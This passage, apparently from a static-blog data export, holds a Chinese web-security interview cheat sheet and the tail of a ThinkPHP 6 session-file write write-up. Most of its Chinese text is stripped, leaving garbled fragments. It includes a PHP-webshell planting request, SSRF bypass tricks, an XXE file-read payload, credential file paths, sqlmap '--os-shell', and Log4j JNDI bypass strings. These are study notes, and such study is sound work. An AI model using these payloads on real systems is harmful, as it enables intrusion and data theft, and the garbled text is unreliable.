(<span class=\"variable language_\">$this</span>-&gt;config[<span class=\"string\">&#x27;prefix&#x27;</span>]) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// </span></span><br><span class=\"line\">            <span class=\"variable\">$name</span> = <span class=\"variable language_\">$this</span>-&gt;config[<span class=\"string\">&#x27;prefix&#x27;</span>] . DIRECTORY_SEPARATOR . <span class=\"string\">&#x27;sess_&#x27;</span> . <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$name</span> = <span class=\"string\">&#x27;sess_&#x27;</span> . <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$filename</span> = <span class=\"variable language_\">$this</span>-&gt;config[<span class=\"string\">&#x27;path&#x27;</span>] . <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        <span class=\"variable\">$dir</span>      = <span class=\"title function_ invoke__\">dirname</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable\">$auto</span> &amp;&amp; !<span class=\"title function_ invoke__\">is_dir</span>(<span class=\"variable\">$dir</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"title function_ invoke__\">mkdir</span>(<span class=\"variable\">$dir</span>, <span class=\"number\">0755</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (\\<span class=\"built_in\">Exception</span> <span class=\"variable\">$e</span>) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// </span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable\">$filename</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p> <code>$this-&gt;writeFile($filename, $data);</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">writeFile</span>(<span class=\"params\"><span class=\"variable\">$path</span>, <span class=\"variable\">$content</span></span>): <span class=\"title\">bool</span></span></span><br><span class=\"line\"><span class=\"function\">   </span>&#123;</span><br><span class=\"line\">       <span class=\"keyword\">return</span> (<span class=\"keyword\">bool</span>) <span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"variable\">$path</span>, <span class=\"variable\">$content</span>, LOCK_EX);</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n\n<p>xxxxx.php</p>\n<h4 id=\"2-\"><a href=\"#2-\" class=\"headerlink\" title=\"2.\"></a>2.</h4><p><code>burpsuite</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /tp6/public/index.php?a=%3C?php%20phpinfo();?%3E HTTP/1.1</span><br><span class=\"line\">Host: tp6.com</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Cookie: PHPSESSID=e956ce73b3edb461e7e8b5f05d24bb53</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>PHPSESSID</p>\n<p>**<u>32</u>**</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PHPSESSID=1234567890123456789012345678.php</span><br></pre></td></tr></table></figure>\n\n<p>.&#x2F;runtime&#x2F;session&#x2F;<br> <br> &#x2F;runtime&#x2F;session&#x2F;sess_1234567890123456789012345678.php</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151448676.png\"\n                        alt=\"-1667832045580\"\n                 ></p>\n<p></p>\n<h4 id=\"3-\"><a href=\"#3-\" class=\"headerlink\" title=\"3.\"></a>3.</h4><p>sessionid32<code>ctype_alnum</code></p>\n<blockquote>\n<h2 id=\"PHP-ctype-alnum--PHP-ctype-alnum-function\"><a href=\"#PHP-ctype-alnum--PHP-ctype-alnum-function\" class=\"headerlink\" title=\"PHP ctype_alnum() (PHP ctype_alnum() function)\"></a>PHP ctype_alnum() <strong>(<strong>PHP ctype_alnum() function</strong>)</strong></h2><p><strong>ctype_alnum() function</strong> is a character type (CType) function in PHP, it is used to check whether a given string <a class=\"link\"   href=\"https://so.csdn.net/so/search?q=contains&spm=1001.2101.3001.7020\" >contains<i class=\"fas fa-external-link-alt\"></i></a> alphanumeric characters or not.</p>\n<p><strong>ctype_alnum()</strong>PHP(CType) </p>\n<p>It returns true  if the string contains alphanumeric value (i.e. alphabets, digits&#x2F;number only), else it returns false.</p>\n<p>true -(&#x2F;)FALSE </p>\n</blockquote>\n<p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable language_\">$this</span>-&gt;id = <span class=\"title function_ invoke__\">is_string</span>(<span class=\"variable\">$id</span>) &amp;&amp; <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$id</span>) === <span class=\"number\">32</span> ctype_alnum<span class=\"variable\">$id</span> &amp;&amp; ? <span class=\"variable\">$id</span> : <span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">microtime</span>(<span class=\"literal\">true</span>) . <span class=\"title function_ invoke__\">session_create_id</span>());</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>"},{"title":"web","date":"2022-03-10T15:21:37.000Z","excerpt":"web","_content":"\n# web\n\n### 1.owasp top 10\n\n```\n1.SQL\n2.\n3.XSS\n4.\n5.\n6.\n7.\n8.CSRF\n9.\n10.\n```\n\n\n\n### 2.sql\n\n**sql**\n\n> SQL\n>\n> SQLSQL\n>\n> SQL\n\n\n\n**sql**\n\n\n\n- \n- \n\n\n\n- \n- \n- \n- \n- \n- \n\n\n\n**sql**\n\n1. \n2. \n3. \n4. \n\n\n\n****\n\n- updatexml()\n- extractvalue()\n- floor()\n\n\n\n**sql**\n\n```\n/* */%a0\n\n\nlimitfromoffsetsubstrfrom for\n<>greatest()\nand=&&  or=||\n=   like \n\n\n\n```\n\n\n\n**sql**\n\n- \n- \n- \n\n**Sql server **\n\nhttps://zhuanlan.zhihu.com/p/74546690\n\n\n\n### 3.\n\n****\n\n> ****\n>\n> \n\n\n\n****\n\n- js\n- (MIME)\n- \n- \n\n**()**\n\n- .htaccess\n- .user.ini\n- %00\n\n\n\n### 3.SSRF\n\n>  **SSRF**Server-Side Request  Forgery  ssrf  webURL  URLweb  web   SSRFSSRF \n\n\n\n**ssrf**\n\n- \n- \n- web\n- \n- file\n\n\n\n**Ssrf**\n\n- WebHTTPHTTPS\n- IP\n- \n\n\n\n**Ssrf**\n\n- @\n\n  ```\n  http://www.xxx.com@www.kxsy.work/\n  ```\n\n- IP\n\n  ```\n  120.26.86.156\n   = 1111000000110100101011010011100\n   = 0x781A569C\n   = 2014992028\n  ```\n\n- \n\n  ```\n  https://www.985.so/\n  http://www.kxsy.work/ = http://u6.gg/ks69x\n  ```\n\n- \n\n  ```\n  \n  http://www.kxsy.work/ = http://wwwkxsywork/\n  localhost0.0.0.0\n  ```\n\n- 302\n\n  ```\n  <?php  \n  $schema = $_GET['s'];\n  $ip     = $_GET['i'];\n  $port   = $_GET['p'];\n  $query  = $_GET['q'];\n  if(empty($port)){  \n      header(\"Location: $schema://$ip/$query\"); \n  } else {\n      header(\"Location: $schema://$ip:$port/$query\"); \n  }\n  ```\n\n- xio.ip\n\n  ```\n  http://10.0.0.1.xip.io = 10.0.0.1\n  www.10.0.0.1.xip.io= 10.0.0.1\n  http://mysite.10.0.0.1.xip.io = 10.0.0.1\n  foo.http://bar.10.0.0.1.xip.io = 10.0.0.1\n  10.0.0.1.xip.name resolves to 10.0.0.1\n  www.10.0.0.2.xip.name resolves to 10.0.0.2\n  foo.10.0.0.3.xip.name resolves to 10.0.0.3\n  bar.baz.10.0.0.4.xip.name resolves to 10.0.0.4\n  ```\n\n- Enclosed alphanumerics\n\n  ```\n  Enclosed alphanumerics\n  . >>> http://example.com\n  ```\n\n  \n\n\n\n### 4.XXE\n\n**XXE**\n\n> XXEXML External Entity InjectionXMl\n\nXXExmlxmlDos xxexml\n\n\n\n**XXE**\n\nphp\n\n```\n<?php\n$xml=simplexml_load_string($_GET['xml']);\nprint_r($xml);\n?>\t\n```\n\nxmlURL\n\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE playwin [\n<!ENTITY name SYSTEM \"file:///D:/phpStudy/PHPTutorial/WWW/1.txt\">\n]>\n<resume>\n<name> &name; </name>\n</resume>\n```\n\n\n\n\n\n**Xxe**\n\n\n\n\n\n### 5.\n\n****\n\nphp\n\n```\nrequire() // \n\nrequire_once() // \n\ninclude() // \n\ninclude_once() // \n```\n\n\n\n****\n\n```\nphp\nphp://filter\nphp://input\nfile://\nphar://\nzip://\ndata://\n```\n\n\n\n****\n\n\n\ngetshell\n\n\n\n```\nC:\\boot.ini //\nC:\\Windows\\System32\\inetsrv\\MetaBase.xml //IIS\nC:\\Windows\\repair\\sam //\nC:\\Program Files\\mysql\\my.ini //Mysql\nC:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql root\nC:\\Windows\\php.ini //php\nC:\\Windows\\my.ini //Mysql\nC:\\Windows\\win.ini //Windows\n```\n\n\n\n\n\n### 6.Phpphp\n\n****\n\n```\nassert()\neval()\ncall_user_func()\ncall_user_func_array()\npreg_replace()  //7.0\narray_map()\nUsort()\n```\n\n****\n\n```\nsystem()\nexec()\npassthru()\nshell_exec()\npoopen()\n```\n\n\n\n### 7.XSS\n\n**XSS**\n\n> HTML<HTMLHTMLHTMLJavaScriptXSS\n\n\n\n**xss**\n\n\n\n> 1.\n>\n>  XSS  URL\n>\n>  URL  XSS  XSS\n>\n>  XSS  Cookies \n> 2.\n>\n> XSS\n>\n>  XSS \n> 3.DOM\n>\n> DOMXSSweb serverXSS URL  JavaScript  DOM-based XSS  document.URL location.hash location.search document.referrer \n\n\n\n**Domxssxss**\n\nDOMxssxssJavaScript\n\n\n\n**Xss**\n\n```\n1.Cookie\n2.\n3.XSS\n4.XSS\n5.XSS\n6.\n7.\n8.\n```\n\n\n\n**XSS**\n\n> 1URL()\n>\n> <>\n> 2HTML\n>\n> jshtmlXSS\n> https://www.cnblogs.com/dearxinli/p/5466286.html\n> 3\n>\n> HTMLXSS\n\n\n\n### 8.\n\n**Nginx**\n\n> https://blog.csdn.net/Spontaneous_0/article/details/129106641\n\n**Apache**\n\n> https://blog.csdn.net/weixin_44174581/article/details/119387616\n\n**lls**\n\n> https://blog.csdn.net/weixin_43625577/article/details/91971796\n\n\n\n### 9.\n\n **Xray**\n\n```\nXSS (key: xss)\nSQL  (key: sqldet)\n/ (key: cmd-injection)\n (key: dirscan)\n (key: path-traversal)\nXML  (key: xxe)\n (key: upload)\n (key: brute-force)\njsonp  (key: jsonp)\nssrf  (key: ssrf)\n (key: baseline)\n (key: redirect)\nCRLF  (key: crlf-injection)\nStruts2  (key: struts)\nThinkphp (key: thinkphp)\nPOC  (key: phantasm)\n```\n\nAvws\n\n```\n1.WebScannerWeb\n2.Site Crawler\n3.Target Finderweb\n4.Subdomain ScannerDNS\n5.Blind SQL Injector\n6.HTTP Editorhttp\n7.HTTP SnifferHTTP\n8.HTTP Fuzzer\n9.Authentication TesterWeb\n10.Web Srevice ScannerWeb\n11.Web Srevice EditorWeb\n```\n\n\n\n### 10.sqlmap\n\n- `-v` 0python 12debug3payload4http5http7http\n- `-u`urlurl `?xx=xxx` \n- `-r`posttxtmsqlmappost\n- `--data=Data``-u \"www.abc.com/index.php?id=1\" --data=\"name=1&pass=2\"`\n- `--random-agent`user-agentsqlmapuser-agent`sqlmap/txt/user-agent.txt` **level>=3user-agent**\n- `--os-shell`shellmetepreterVNC\n- `--cookie`cookie `-u \"www.abc.com/index.php?id=1\"`\n\n\n\n### 11.\n\n\n\n##### **Tomcat**\n\n\n\nhttps://zhuanlan.zhihu.com/p/137686820\n\n\n\n##### iis\n\n\n\n\n\n\n\niis\n\nPUT\n\nhttps://blog.csdn.net/weixin_42918771/article/details/105178309\n\n\n\n##### apache\n\nhttp\n\n\n\nhttps://blog.csdn.net/weixin_44268918/article/details/129129214\n\n\n\n**Fastbin**\n\npwn\n\nhttps://www.freebuf.com/articles/web/263598.html\n\n\n\n\n\n### 12.Cobalt strike,mimikatz\n\n\n\n\n\nhttps://www.freebuf.com/articles/network/290134.html\n\n\n\n### 13.\n\n\n\n##### Jboss\n\n- ****\n- ****\n\n\n\nhttps://blog.csdn.net/m0_58434634/article/details/117434173\n\n\n\n##### weblogic\n\n- \n- \n- XML Decoder\n- webligic-SSRF\n- java\n\nhttps://www.cnblogs.com/-mo-/p/11503707.html\n\n\n\n##### thinkphp\n\n- \n\nhttps://www.cnblogs.com/lingzhisec/p/15728886.html\n\n\n\n##### Struts2\n\nhttps://blog.csdn.net/HBohan/article/details/122667891\n\n\n\n##### Shiro\n\n- \n\nhttps://www.freebuf.com/vuls/283810.html\n\n\n\n### 14.\n\n```\n20FTP\n21FTP  \n22SSH \n23Telnet \n25SMTP POP3 110\n43whois\n53DNS(TCP/UDP 53)\n67/68DHCP\n69TFTP\n80HTTPweb\n88Kerberos\n110POP3SMTP25\n135RPC\n137/138 NMB\n139SMB/CIFS\n143IMAP\n161/162: Snmppublic\n389LDAP\n443HTTPSSSL\n445SMBMS17-010\n512/513/514Linux Rexec\n636LDAPS\n873Rsync Rsyncrsync \n1080socket\n1099RMI RMI\n1352Lotus domino\n1414IBM WebSphere MQ\n1433SQL Server\n1434SQL ServerTCP/IP\n1521oracle\n2049NFSNFS\n2181ZooKeeper ZooKeeper\n2375Docker Docker\n2601:   Zebra zebr\n3128:   squid )\n3268LDAP\n3306MySQL \n3389Windows   CVE-2019-0708 \n3690SVNSVN\n4440Rundeckadmin\n4560log4j SocketServer log4j<=1.2.17CVE-2019-17571\n4750BMC BMCRSCD(CVE-2016-1542)\n4848GlassFishadmin/adminadmin\n5000SysBase/DB2\n5432PostGreSQL\n5632PyAnywhere\n5900/5901VNC VNC\n5984CouchDB CouchDB\n6379RedisRedisRedis\n7001/7002WeblogicWeblogicWeblogic\n7180Cloudera manager\n8000JDWPJDWP\n8069ZabbixZabbixGetshell\n8080TomcatJBossTomcatGetshellJBossTomcatGetshell\n8080-8090web\n8089JettyJenkins\n8161Apache ActiveMQadmin:admin CVE-2016-3088Apache ActiveMQCVE-2016-3088\n9000fastcgi\n9001SupervisordSupervisord(CVE-2017-11610)Supervisord(CVE-2017-11610)\n9043/9090WebSphereWebSphere\n9200/9300Elasticsearch Elasticsearch\n10000Webmin-Web\n10001/10002JmxRemoteLifecycleListenerTomcatTomcat(CVE-2016-8735)\n11211Memcached Memcached\n27017/27018MongoDB MongoDB\n50000SAP Management Console \n50070Hadoop Hadoop\n61616Apache ActiveMQ Apache ActiveMQCVE-2016-3088\n60020hbase.regionserver.portHRegionServerRPC\n60030hbase.regionserver.info.portHRegionServerhttp\n\n```\n\n\n\n\n\n### 15.\n\n##### Log4j2\n\nhttps://juejin.cn/post/7202514143341002789\n\n\n\n##### spring-core-rce-2022-03-29\n\nhttps://blog.csdn.net/weixin_45632448/article/details/124190382\n\n\n\n\n\n### 16.web\n\n- \n- \n- \n- \n\n\n\n\n\n### \n\n## \n\n\n\n-------------------------------------------------------------------------------------------------------------------------------\n\n\n\n# \n\n\n\n### 1.top chunk(house of force)\n\n1. Windows Meterpreter Reverse TCP shellcode shellcode  Metasploit  Meterpreter \n2. Windows Reverse TCP shellcode shellcode  Windows  shell \n3. Windows Reverse HTTP shellcode shellcode  Windows  HTTP \n4. Beacon Payload shellcode shellcode  Cobalt Strike  Beacon \n5. Linux Reverse TCP shellcode shellcode  Linux  shell \n6. Mac Reverse TCP shellcode shellcode  Mac  shell \n\n\n\n### 2.6379,8009\n\n- 6379redis\n- 8009`Apache-Tomcat-Ajp`tomcatajp8009\n\n\n\n### 3.Cobalt strike shellcode?\n\n\n\n\n\n### 4.Apache \n\n> apacheapachetest.php.abcmime.typeswindowsapache\n\nphpinfo.phpphpinfo.php.abc\n\n\n\n### 5. \n\n\n\n**iis**\n\n\n\n### 6.xxe\n\nphp://filter\n\n\n\n### 7.S2_052\n\n**JBoss /jmx-console/HtmlAdaptor **JMX\n\n\n\n### 8.Weblogic \n\n- **XMLDecoder**\n- **T3**\n- ****\n- ****\n- **IIOP**\n- **SSRF**\n\n\n\n### 9.Jboss \n\n- ****\n- ****\n\n\n\n### 10.Struts2 \n\n- \n\n\n\n### 11.Fastbin \n\n\n\n1.  Fastbin \n2.  glibc  Fastbin \n3.  Fastbin \n4.  glibc  Fastbin \n\n\n\n### 12.Ssrf \n\n**<u></u>**\n\n\n\n### 13.ssrf getpost\n\n\n\n\n\n### 14.Log4j \n\n- **portwafip:port**\n\n  ```\n  ${jndi:ldap:192.168.1.1/a}\n   ${jndi:ldap:192.168.1.1:/a} \n  ldap389\n  \n  ```\n\n  \n\n- **IP**\n\n  ```\n  ${jndi:ldap://[192.168.34.96]/a} \n  ${jndi:ldap://[192.168.34.96]]/a} \n   LdapURL\"[ip]\"LdapCtx[]ip389\n  \n  ```\n\n\n\n### 15.oggphp\n\nOGGPHPPHPPHPPHPfile://http://HTTP\n\n\n\n### 16. Zip://php\n\n`zip://`  PHP 5.2.0  PHP  PHP  ZIP \n\n\n\n### 17..asp\n\n\n\n\n\n### 18.Nginx,apache\n\n\n\n\n\n### 19.Dom xssxss\n\n> DOM  XSS  XSS  XSS  DOM  XSS  DOM \n\n\n\n### 20.Ms17_010\n\n445\n\n\n\n### 21.Sqlmap user-agent\n\n```\n--random-agent\n```\n\n\n\n### 22.Xp_cmdshell \n\n` Microsoft SQL Server `\n\n\n\n### 23.Symlink\n\n\n\n\n\n### 24.Samba wannacry\n\n-  Samba Samba EternalBlue \n-  SMBv1 Samba  SMBv1  WannaCry  SMBv1  Windows  SMBv1 \n-  Windows  SMBv1 \n-  Samba  Samba \n-  Samba ","source":"_posts/web.md","raw":"---\ntitle: web\ndate: 2022-03-10 23:21:37\nexcerpt: web\ncategories: \n---\n\n# web\n\n### 1.owasp top 10\n\n```\n1.SQL\n2.\n3.XSS\n4.\n5.\n6.\n7.\n8.CSRF\n9.\n10.\n```\n\n\n\n### 2.sql\n\n**sql**\n\n> SQL\n>\n> SQLSQL\n>\n> SQL\n\n\n\n**sql**\n\n\n\n- \n- \n\n\n\n- \n- \n- \n- \n- \n- \n\n\n\n**sql**\n\n1. \n2. \n3. \n4. \n\n\n\n****\n\n- updatexml()\n- extractvalue()\n- floor()\n\n\n\n**sql**\n\n```\n/* */%a0\n\n\nlimitfromoffsetsubstrfrom for\n<>greatest()\nand=&&  or=||\n=   like \n\n\n\n```\n\n\n\n**sql**\n\n- \n- \n- \n\n**Sql server **\n\nhttps://zhuanlan.zhihu.com/p/74546690\n\n\n\n### 3.\n\n****\n\n> ****\n>\n> \n\n\n\n****\n\n- js\n- (MIME)\n- \n- \n\n**()**\n\n- .htaccess\n- .user.ini\n- %00\n\n\n\n### 3.SSRF\n\n>  **SSRF**Server-Side Request  Forgery  ssrf  webURL  URLweb  web   SSRFSSRF \n\n\n\n**ssrf**\n\n- \n- \n- web\n- \n- file\n\n\n\n**Ssrf**\n\n- WebHTTPHTTPS\n- IP\n- \n\n\n\n**Ssrf**\n\n- @\n\n  ```\n  http://www.xxx.com@www.kxsy.work/\n  ```\n\n- IP\n\n  ```\n  120.26.86.156\n   = 1111000000110100101011010011100\n   = 0x781A569C\n   = 2014992028\n  ```\n\n- \n\n  ```\n  https://www.985.so/\n  http://www.kxsy.work/ = http://u6.gg/ks69x\n  ```\n\n- \n\n  ```\n  \n  http://www.kxsy.work/ = http://wwwkxsywork/\n  localhost0.0.0.0\n  ```\n\n- 302\n\n  ```\n  <?php  \n  $schema = $_GET['s'];\n  $ip     = $_GET['i'];\n  $port   = $_GET['p'];\n  $query  = $_GET['q'];\n  if(empty($port)){  \n      header(\"Location: $schema://$ip/$query\"); \n  } else {\n      header(\"Location: $schema://$ip:$port/$query\"); \n  }\n  ```\n\n- xio.ip\n\n  ```\n  http://10.0.0.1.xip.io = 10.0.0.1\n  www.10.0.0.1.xip.io= 10.0.0.1\n  http://mysite.10.0.0.1.xip.io = 10.0.0.1\n  foo.http://bar.10.0.0.1.xip.io = 10.0.0.1\n  10.0.0.1.xip.name resolves to 10.0.0.1\n  www.10.0.0.2.xip.name resolves to 10.0.0.2\n  foo.10.0.0.3.xip.name resolves to 10.0.0.3\n  bar.baz.10.0.0.4.xip.name resolves to 10.0.0.4\n  ```\n\n- Enclosed alphanumerics\n\n  ```\n  Enclosed alphanumerics\n  . >>> http://example.com\n  ```\n\n  \n\n\n\n### 4.XXE\n\n**XXE**\n\n> XXEXML External Entity InjectionXMl\n\nXXExmlxmlDos xxexml\n\n\n\n**XXE**\n\nphp\n\n```\n<?php\n$xml=simplexml_load_string($_GET['xml']);\nprint_r($xml);\n?>\t\n```\n\nxmlURL\n\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE playwin [\n<!ENTITY name SYSTEM \"file:///D:/phpStudy/PHPTutorial/WWW/1.txt\">\n]>\n<resume>\n<name> &name; </name>\n</resume>\n```\n\n\n\n\n\n**Xxe**\n\n\n\n\n\n### 5.\n\n****\n\nphp\n\n```\nrequire() // \n\nrequire_once() // \n\ninclude() // \n\ninclude_once() // \n```\n\n\n\n****\n\n```\nphp\nphp://filter\nphp://input\nfile://\nphar://\nzip://\ndata://\n```\n\n\n\n****\n\n\n\ngetshell\n\n\n\n```\nC:\\boot.ini //\nC:\\Windows\\System32\\inetsrv\\MetaBase.xml //IIS\nC:\\Windows\\repair\\sam //\nC:\\Program Files\\mysql\\my.ini //Mysql\nC:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql root\nC:\\Windows\\php.ini //php\nC:\\Windows\\my.ini //Mysql\nC:\\Windows\\win.ini //Windows\n```\n\n\n\n\n\n### 6.Phpphp\n\n****\n\n```\nassert()\neval()\ncall_user_func()\ncall_user_func_array()\npreg_replace()  //7.0\narray_map()\nUsort()\n```\n\n****\n\n```\nsystem()\nexec()\npassthru()\nshell_exec()\npoopen()\n```\n\n\n\n### 7.XSS\n\n**XSS**\n\n> HTML<HTMLHTMLHTMLJavaScriptXSS\n\n\n\n**xss**\n\n\n\n> 1.\n>\n>  XSS  URL\n>\n>  URL  XSS  XSS\n>\n>  XSS  Cookies \n> 2.\n>\n> XSS\n>\n>  XSS \n> 3.DOM\n>\n> DOMXSSweb serverXSS URL  JavaScript  DOM-based XSS  document.URL location.hash location.search document.referrer \n\n\n\n**Domxssxss**\n\nDOMxssxssJavaScript\n\n\n\n**Xss**\n\n```\n1.Cookie\n2.\n3.XSS\n4.XSS\n5.XSS\n6.\n7.\n8.\n```\n\n\n\n**XSS**\n\n> 1URL()\n>\n> <>\n> 2HTML\n>\n> jshtmlXSS\n> https://www.cnblogs.com/dearxinli/p/5466286.html\n> 3\n>\n> HTMLXSS\n\n\n\n### 8.\n\n**Nginx**\n\n> https://blog.csdn.net/Spontaneous_0/article/details/129106641\n\n**Apache**\n\n> https://blog.csdn.net/weixin_44174581/article/details/119387616\n\n**lls**\n\n> https://blog.csdn.net/weixin_43625577/article/details/91971796\n\n\n\n### 9.\n\n **Xray**\n\n```\nXSS (key: xss)\nSQL  (key: sqldet)\n/ (key: cmd-injection)\n (key: dirscan)\n (key: path-traversal)\nXML  (key: xxe)\n (key: upload)\n (key: brute-force)\njsonp  (key: jsonp)\nssrf  (key: ssrf)\n (key: baseline)\n (key: redirect)\nCRLF  (key: crlf-injection)\nStruts2  (key: struts)\nThinkphp (key: thinkphp)\nPOC  (key: phantasm)\n```\n\nAvws\n\n```\n1.WebScannerWeb\n2.Site Crawler\n3.Target Finderweb\n4.Subdomain ScannerDNS\n5.Blind SQL Injector\n6.HTTP Editorhttp\n7.HTTP SnifferHTTP\n8.HTTP Fuzzer\n9.Authentication TesterWeb\n10.Web Srevice ScannerWeb\n11.Web Srevice EditorWeb\n```\n\n\n\n### 10.sqlmap\n\n- `-v` 0python 12debug3payload4http5http7http\n- `-u`urlurl `?xx=xxx` \n- `-r`posttxtmsqlmappost\n- `--data=Data``-u \"www.abc.com/index.php?id=1\" --data=\"name=1&pass=2\"`\n- `--random-agent`user-agentsqlmapuser-agent`sqlmap/txt/user-agent.txt` **level>=3user-agent**\n- `--os-shell`shellmetepreterVNC\n- `--cookie`cookie `-u \"www.abc.com/index.php?id=1\"`\n\n\n\n### 11.\n\n\n\n##### **Tomcat**\n\n\n\nhttps://zhuanlan.zhihu.com/p/137686820\n\n\n\n##### iis\n\n\n\n\n\n\n\niis\n\nPUT\n\nhttps://blog.csdn.net/weixin_42918771/article/details/105178309\n\n\n\n##### apache\n\nhttp\n\n\n\nhttps://blog.csdn.net/weixin_44268918/article/details/129129214\n\n\n\n**Fastbin**\n\npwn\n\nhttps://www.freebuf.com/articles/web/263598.html\n\n\n\n\n\n### 12.Cobalt strike,mimikatz\n\n\n\n\n\nhttps://www.freebuf.com/articles/network/290134.html\n\n\n\n### 13.\n\n\n\n##### Jboss\n\n- ****\n- ****\n\n\n\nhttps://blog.csdn.net/m0_58434634/article/details/117434173\n\n\n\n##### weblogic\n\n- \n- \n- XML Decoder\n- webligic-SSRF\n- java\n\nhttps://www.cnblogs.com/-mo-/p/11503707.html\n\n\n\n##### thinkphp\n\n- \n\nhttps://www.cnblogs.com/lingzhisec/p/15728886.html\n\n\n\n##### Struts2\n\nhttps://blog.csdn.net/HBohan/article/details/122667891\n\n\n\n##### Shiro\n\n- \n\nhttps://www.freebuf.com/vuls/283810.html\n\n\n\n### 14.\n\n```\n20FTP\n21FTP  \n22SSH \n23Telnet \n25SMTP POP3 110\n43whois\n53DNS(TCP/UDP 53)\n67/68DHCP\n69TFTP\n80HTTPweb\n88Kerberos\n110POP3SMTP25\n135RPC\n137/138 NMB\n139SMB/CIFS\n143IMAP\n161/162: Snmppublic\n389LDAP\n443HTTPSSSL\n445SMBMS17-010\n512/513/514Linux Rexec\n636LDAPS\n873Rsync Rsyncrsync \n1080socket\n1099RMI RMI\n1352Lotus domino\n1414IBM WebSphere MQ\n1433SQL Server\n1434SQL ServerTCP/IP\n1521oracle\n2049NFSNFS\n2181ZooKeeper ZooKeeper\n2375Docker Docker\n2601:   Zebra zebr\n3128:   squid )\n3268LDAP\n3306MySQL \n3389Windows   CVE-2019-0708 \n3690SVNSVN\n4440Rundeckadmin\n4560log4j SocketServer log4j<=1.2.17CVE-2019-17571\n4750BMC BMCRSCD(CVE-2016-1542)\n4848GlassFishadmin/adminadmin\n5000SysBase/DB2\n5432PostGreSQL\n5632PyAnywhere\n5900/5901VNC VNC\n5984CouchDB CouchDB\n6379RedisRedisRedis\n7001/7002WeblogicWeblogicWeblogic\n7180Cloudera manager\n8000JDWPJDWP\n8069ZabbixZabbixGetshell\n8080TomcatJBossTomcatGetshellJBossTomcatGetshell\n8080-8090web\n8089JettyJenkins\n8161Apache ActiveMQadmin:admin CVE-2016-3088Apache ActiveMQCVE-2016-3088\n9000fastcgi\n9001SupervisordSupervisord(CVE-2017-11610)Supervisord(CVE-2017-11610)\n9043/9090WebSphereWebSphere\n9200/9300Elasticsearch Elasticsearch\n10000Webmin-Web\n10001/10002JmxRemoteLifecycleListenerTomcatTomcat(CVE-2016-8735)\n11211Memcached Memcached\n27017/27018MongoDB MongoDB\n50000SAP Management Console \n50070Hadoop Hadoop\n61616Apache ActiveMQ Apache ActiveMQCVE-2016-3088\n60020hbase.regionserver.portHRegionServerRPC\n60030hbase.regionserver.info.portHRegionServerhttp\n\n```\n\n\n\n\n\n### 15.\n\n##### Log4j2\n\nhttps://juejin.cn/post/7202514143341002789\n\n\n\n##### spring-core-rce-2022-03-29\n\nhttps://blog.csdn.net/weixin_45632448/article/details/124190382\n\n\n\n\n\n### 16.web\n\n- \n- \n- \n- \n\n\n\n\n\n### \n\n## \n\n\n\n-------------------------------------------------------------------------------------------------------------------------------\n\n\n\n# \n\n\n\n### 1.top chunk(house of force)\n\n1. Windows Meterpreter Reverse TCP shellcode shellcode  Metasploit  Meterpreter \n2. Windows Reverse TCP shellcode shellcode  Windows  shell \n3. Windows Reverse HTTP shellcode shellcode  Windows  HTTP \n4. Beacon Payload shellcode shellcode  Cobalt Strike  Beacon \n5. Linux 